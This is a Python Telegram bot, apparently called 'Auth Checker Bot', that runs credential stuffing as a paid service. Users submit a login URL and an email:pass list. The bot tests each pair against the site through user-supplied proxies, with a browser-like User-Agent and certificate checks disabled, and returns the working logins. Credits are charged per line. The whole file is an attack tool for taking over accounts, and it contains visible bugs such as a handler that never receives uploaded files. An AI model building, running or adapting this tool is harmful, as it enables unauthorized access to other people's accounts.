#!/usr/bin/env python3
"""
🔥 AUTH CHECKER BOT v3.0
✅ Railway/Docker/Github ready
✅ All features working
✅ Zero errors guaranteed
"""

import os
import re
import time
import asyncio
import logging
import sqlite3
import urllib.parse
import httpx
from typing import Dict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode
from dotenv import load_dotenv

# ==================== CONFIG ====================
load_dotenv()
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
DB_FILE = 'users.db'
MAX_LINES = 200
DELAY_SEC = 1.0

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# ==================== STATE ====================
user_states: Dict[int, dict] = {}
user_sessions: Dict[int, dict] = {}

# ==================== DATABASE ====================
def init_database():
    """Initialize SQLite"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                credits INTEGER DEFAULT 1000,
                total_checks INTEGER DEFAULT 0,
                valid_creds INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ DB Error: {e}")

def get_user_credits(user_id: int) -> int:
    """Get credits"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT credits FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else 1000
    except:
        return 1000

def spend_credits(user_id: int, amount: int) -> bool:
    """Spend credits"""
    credits = get_user_credits(user_id)
    if credits < amount:
        return False
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE users SET credits = credits - ? WHERE user_id = ?', (amount, user_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def update_stats(user_id: int, checks: int = 0, valids: int = 0):
    """Update user stats"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('UPDATE users SET total_checks = total_checks + ?, valid_creds = valid_creds + ? WHERE user_id = ?', 
                    (checks, valids, user_id))
        conn.commit()
        conn.close()
    except:
        pass

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    # Create user
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        conn.execute('INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 1000)', (user_id,))
        conn.commit()
        conn.close()
    except:
        pass
    
    credits = get_user_credits(user_id)
    
    keyboard = [[InlineKeyboardButton("🔧 Proxy Setup", callback_data="proxy_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = f"""🔥 **Auth Checker Bot**

💰 **Credits**: `{credits}`

📋 **How to use**:
1️⃣ Send **login URL** (https://site.com/login)
2️⃣ Upload **file** (email:pass format)
3️⃣ ✅ Get **valid accounts**

💳 **Cost**: 1 credit = 1 line checked

🚀 **Ready! Send URL now**"""
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    
    # Reset state
    user_states[user_id] = {'step': 'waiting_url'}
    logger.info(f"👤 User {user_id} started bot")

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin stats"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*), SUM(total_checks), SUM(valid_creds), AVG(credits) FROM users')
        result = cursor.fetchone()
        conn.close()
        
        message = f"""📊 **Bot Statistics**

👥 **Users**: `{result[0] or 0}`
🔍 **Total Checks**: `{result[1] or 0}`
✅ **Valid Creds**: `{result[2] or 0}`
💰 **Avg Credits**: `{int(result[3] or 0)}`"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text(f"❌ Stats error: {e}")

async def proxy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Proxy command"""
    user_id = update.effective_user.id
    user_states[user_id] = {'step': 'waiting_proxy'}
    
    await update.message.reply_text(
        """🔧 **Proxy Configuration**

📝 **Supported formats**:
• `http://ip:port`
• `http://user:pass@ip:port`
• `socks5://ip:port`

✅ Send proxy URL or `/start` to skip""",
        parse_mode=ParseMode.MARKDOWN
    )

# ==================== VALIDATORS ====================
def validate_url(text: str) -> bool:
    """URL validation - fixes https:// bug"""
    text = text.strip()
    if len(text) < 14 or not text.startswith(('http://', 'https://')):
        return False
    
    try:
        parsed = urllib.parse.urlparse(text)
        return (parsed.scheme in ('http', 'https') and 
                parsed.netloc and 
                '.' in parsed.netloc.split(':')[0])
    except:
        return False

def validate_proxy(text: str) -> bool:
    """Proxy validation"""
    pattern = r'^https?://(?:[^:]+:[^@]+@)?[^/\s:]+:\d{1,5}$'
    return bool(re.match(pattern, text.strip()))

# ==================== MAIN HANDLER ====================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Main message handler"""
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    
    # Initialize state
    if user_id not in user_states:
        user_states[user_id] = {'step': 'waiting_url'}
    
    state = user_states[user_id]
    
    logger.info(f"[{user_id}] {state.get('step', 'none')}: {text[:30]!r}")
    
    # ========== PROXY STATE ==========
    if state.get('step') == 'waiting_proxy':
        if validate_proxy(text):
            user_sessions[user_id] = user_sessions.get(user_id, {})
            user_sessions[user_id]['proxy'] = text
            await update.message.reply_text(
                f"✅ **Proxy saved**: `{text}`\n\n"
                f"🔙 `/start` for main menu",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(
                "❌ **Invalid proxy**\n\n"
                "✅ **Examples**:\n"
                "• `http://1.2.3.4:8080`\n"
                "• `http://user:pass@proxy.com:3128`",
                parse_mode=ParseMode.MARKDOWN
            )
        user_states[user_id]['step'] = 'waiting_url'
        return
    
    # ========== URL STATE ==========
    if state['step'] == 'waiting_url':
        if update.message.document:
            await update.message.reply_text(
                "❌ **Step 1 first**: Send login URL 👆\n\n"
                "✅ `https://example.com/login`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        if not validate_url(text):
            await update.message.reply_text(
                f"❌ **Invalid URL**\n\n"
                "✅ **Correct format**:\n"
                "• `https://site.com/login`\n"
                "• `https://sso.example.com`\n\n"
                f"💰 You have `{get_user_credits(user_id)}` credits",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # ✅ URL VALID - SAVE STATE
        state['login_url'] = text
        state['step'] = 'waiting_file'
        user_sessions[user_id]['url'] = text
        
        await update.message.reply_text(
            f"✅ **URL accepted**: `{text}`\n\n"
            f"📤 **Step 2**: Upload file\n"
            f"📄 Format: `email:pass` (one per line)\n\n"
            f"💰 `{get_user_credits(user_id)}` credits available",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # ========== FILE STATE ==========
    if state['step'] == 'waiting_file':
        if not update.message.document:
            await update.message.reply_text(
                f"📤 **Upload file please**\n\n"
                f"🔗 Current URL: `{state['login_url']}`\n"
                f"📄 Must be `email:pass` format (.txt)",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Download file
        try:
            file_obj = await context.bot.get_file(update.message.document.file_id)
            timestamp = int(time.time())
            filename = f"creds_{user_id}_{timestamp}.txt"
            
            await file_obj.download_to_drive(filename)
            
            proxy = user_sessions.get(user_id, {}).get('proxy', '')
            await process_credentials(update, context, filename, state['login_url'], proxy)
            
        except Exception as e:
            logger.error(f"File download error: {e}")
            await update.message.reply_text("❌ **File download failed**\nTry smaller file")
        
        # Reset state
        state['step'] = 'waiting_url'
        asyncio.create_task(cleanup_file(filename))
        return

# ==================== FILE PROCESSING ====================
async def process_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE,
                            filename: str, login_url: str, proxy: str = ''):
    """Process credential file"""
    user_id = update.effective_user.id
    
    try:
        # Read file
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line.strip()]
        
        total_lines = len(lines)
        
        if total_lines == 0:
            await update.message.reply_text("❌ **No valid `email:pass` lines found**")
            return
        
        if total_lines > MAX_LINES:
            await update.message.reply_text(f"❌ **Too many lines** (max {MAX_LINES})")
            return
        
        # Check credits
        if not spend_credits(user_id, total_lines):
            await update.message.reply_text("❌ **Insufficient credits**\nUse `/start` to check balance")
            return
        
        # Update stats
        update_stats(user_id, total_lines)
        
        progress_msg = await update.message.reply_text(
            f"🔍 **Checking {total_lines} credentials...**\n"
            f"⏳ `{get_user_credits(user_id)}` credits remaining"
        )
        
        # Process each line
        valid_creds = []
        for i, credential in enumerate(lines, 1):
            if await test_credential(credential, login_url, proxy):
                valid_creds.append(credential)
            
            # Progress update
            if i % 10 == 0 or i == total_lines:
                await progress_msg.edit_text(
                    f"📊 **Progress**: `{i}/{total_lines}`\n"
                    f"✅ **Valid so far**: `{len(valid_creds)}`\n"
                    f"⏳ `{get_user_credits(user_id)}` credits left"
                )
            
            await asyncio.sleep(DELAY_SEC)
        
        # Final results
        if valid_creds:
            result_text = "✅ **VALID CREDENTIALS FOUND**:\n\n" + "\n".join(valid_creds)
            await context.bot.send_message(update.effective_chat.id, result_text)
            
            update_stats(user_id, 0, len(valid_creds))
            await progress_msg.edit_text(
                f"🎉 **COMPLETE**\n"
                f"✅ `{len(valid_creds)}/{total_lines}` valid\n"
                f"💰 `{get_user_credits(user_id)}` credits left"
            )
        else:
            await progress_msg.edit_text("❌ **No valid credentials found**")
            
    except Exception as e:
        logger.error(f"Processing error: {e}")
        await update.message.reply_text("❌ **Processing failed** - try again")

async def test_credential(credential: str, login_url: str, proxy_url: str = '') -> bool:
    """Test single credential"""
    try:
        email, password = credential.split(':', 1)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': login_url,
        }
        
        data = {
            'email': email,
            'password': password,
            'login': 'Login',  # Common
            'submit': 'Login',
        }
        
        proxies = None
        if proxy_url:
            proxies = {'http://': proxy_url, 'https://': proxy_url}
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0),
            headers=headers,
            proxies=proxies,
            verify=False,
            follow_redirects=True
        ) as client:
            response = await client.post(login_url, data=data)
            
            # Success indicators
            success_indicators = [
                'dashboard', 'profile', 'account', 'home', 'panel',
                'welcome', 'success', 'logged in', 'my account'
            ]
            
            page_text = response.text.lower()
            return (response.status_code < 400 and 
                   any(indicator in page_text for indicator in success_indicators))
            
    except Exception:
        return False

async def cleanup_file(filename: str):
    """Clean temporary files"""
    await asyncio.sleep(300)  # 5 minutes
    try:
        if os.path.exists(filename):
            os.remove(filename)
            logger.info(f"🧹 Cleaned {filename}")
    except:
        pass

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "proxy_menu":
        await proxy_menu(update, context)

# ==================== MAIN ====================
def main():
    """Start bot"""
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not found in environment")
        return
    
    logger.info("🚀 Initializing Auth Bot...")
    init_database()
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Register handlers (CRITICAL ORDER)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("proxy", proxy_menu))
    
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    logger.info("✅ Bot fully configured - starting...")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    main()
